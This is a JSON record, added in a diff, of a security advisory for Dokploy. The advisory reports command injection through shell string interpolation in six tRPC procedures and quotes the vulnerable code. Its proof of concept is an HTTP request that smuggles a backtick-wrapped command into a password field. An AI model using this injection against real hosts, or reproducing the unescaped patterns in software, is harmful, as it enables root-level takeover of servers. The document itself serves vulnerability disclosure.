@@ -1,0 +1,46 @@
+{
+  "global": null,
+  "id": "GHSA-gx7w-xwfw-w342",
+  "repo": {
+    "cve_id": null,
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 8.8,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-78"
+    ],
+    "description": "### Summary\r\n\r\nMultiple tRPC procedures interpolate user-controlled input directly into shell command strings executed via `execAsync` with `{ shell: \"/bin/bash\" }`. No shell escaping or input validation is applied. An authenticated member with service access can execute arbitrary commands on the Dokploy host as the daemon process (typically root).\r\n\r\n### Details\r\n\r\nThe following user-controlled fields flow into shell command templates without sanitization:\r\n\r\n**1. Database `changePassword` (postgres.ts, mysql.ts, mariadb.ts, mongo.ts)**\r\n\r\nThe `DATABASE_PASSWORD_REGEX` at `packages/server/src/db/schema/utils.ts` blocks `$`, `!`, `'`, `\"`, `\\`, `/`, and space, but explicitly permits backtick (`` ` ``) and semicolon (`;`):\r\n\r\n```\r\n/^[a-zA-Z0-9@#%^&*()_+\\-=[\\]{}|;:,.<>?~`]*$/\r\n```\r\n\r\nThe password is interpolated into a `bash -c \"...\"` double-quoted string at `apps/dokploy/server/api/routers/postgres.ts:436-456`:\r\n\r\n```ts\r\nconst command = `\r\n  CONTAINER_ID=$(${containerCmd})\r\n  docker exec \"$CONTAINER_ID\" psql -U ${databaseUser} -c \"ALTER USER \\\\\"${databaseUser}\\\\\" WITH PASSWORD '${password}';\"\r\n`;\r\nawait execAsync(command, { shell: \"/bin/bash\" });\r\n```\r\n\r\nBackticks trigger command substitution inside double-quoted bash strings.\r\n\r\n**2. Backup restore (`backup.restoreBackupWithLogs`)**\r\n\r\n`databaseName` is validated as `z.string().min(1)` only at `apps/dokploy/server/api/routers/backup.ts:547`. The value reaches `packages/server/src/utils/restore/utils.ts:5-22`:\r\n\r\n```ts\r\ndocker exec -i $CONTAINER_ID sh -c \"pg_restore -U 'user' -d ${database} -O --clean --if-exists\"\r\n```\r\n\r\n**3. Volume backup (`volumeBackups.create`)**\r\n\r\n`volumeName` and `serviceName` are unrestricted text fields at `packages/server/src/db/schema/volume-backups.ts:116`. They reach `packages/server/src/utils/volume-backups/backup.ts:43-156`:\r\n\r\n```ts\r\ndocker run --rm -v ${volumeName}:/volume_data ...\r\ndocker service inspect ${compose.appName}_${volumeBackup.serviceName}\r\n```\r\n\r\n**4. Certificate creation (`certificate.create`)**\r\n\r\n`certificatePath` is `z.string().optional()` at `packages/server/src/db/schema/certificate.ts:42`. A user-supplied value overrides the `$defaultFn` and flows to `packages/server/src/services/certificate.ts:32`:\r\n\r\n```ts\r\nmkdir -p ${certDir}; echo \"${certificateData}\" | base64 -d > \"${crtPath}\"\r\n```\r\n\r\n**5. Mount file creation (`mount.create`)**\r\n\r\n`filePath` is `z.string().optional()` at `packages/server/src/db/schema/mount.ts:125`. The value flows to `packages/server/src/utils/docker/utils.ts:686,708`:\r\n\r\n```ts\r\nmkdir -p ${directory}; echo \"...\" | base64 -d > \"${fullPath}\"\r\n```\r\n\r\n**6. Custom git URL (`application.saveGitProvider`)**\r\n\r\n`customGitUrl` is `z.string()` with no URL validation at `packages/server/src/db/schema/application.ts:506-521`. While `customGitBranch` is now validated by `VALID_BRANCH_REGEX` (fixed in v0.29.3), the URL is not. The value flows to `packages/server/src/utils/providers/git.ts:81`:\r\n\r\n```ts\r\ngit clone --branch ${customGitBranch} --depth 1 ${customGitUrl} ${outputPath}\r\n```\r\n\r\n### PoC\r\n\r\n**Database changePassword (backtick injection):**\r\n\r\n1. Create a Postgres service with a normal database username through the Dokploy UI.\r\n2. Ensure the Postgres container is running.\r\n3. Send the following request from an authenticated session:\r\n\r\n```\r\nPOST /api/trpc/postgres.changePassword?batch=1 HTTP/1.1\r\nHost: <target>:3000\r\nContent-Type: application/json\r\nCookie: better-auth.session_token=<session>\r\n\r\n{\"0\":{\"json\":{\"postgresId\":\"<postgres_id>\",\"password\":\"`id`\"}}}\r\n```\r\n\r\n4. Response: HTTP 200 OK with `[{\"result\":{\"data\":{\"json\":true}}}]`.\r\n\r\nThe backtick-wrapped `id` command is accepted by `DATABASE_PASSWORD_REGEX` and executes on the Dokploy host when bash processes the password change command. The `$(...)` syntax is blocked by the regex, but backticks are functionally equivalent for command substitution inside double-quoted bash strings.\r\n\r\n### Impact\r\n\r\nAn authenticated member with service-level access can execute arbitrary commands on the Dokploy host or on remote managed servers via `execAsyncRemote`. In the default Docker deployment, the daemon runs as root. Volume backup injection persists via cron even after the attacker's access is revoked.",
+    "ghsa_id": "GHSA-gx7w-xwfw-w342",
+    "html_url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-gx7w-xwfw-w342",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-gx7w-xwfw-w342"
+      }
+    ],
+    "published_at": "2026-11-12T08:17:39Z",
+    "references": [],
+    "severity": "high",
+    "summary": "Command Injection via Shell String Interpolation",
+    "updated_at": "2026-11-12T08:17:39Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "other",
+          "name": "dokploy"
+        },
+        "patched_versions": "0.31.1",
+        "vulnerable_version_range": "< 0.31.1"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "Dokploy/dokploy"
+}
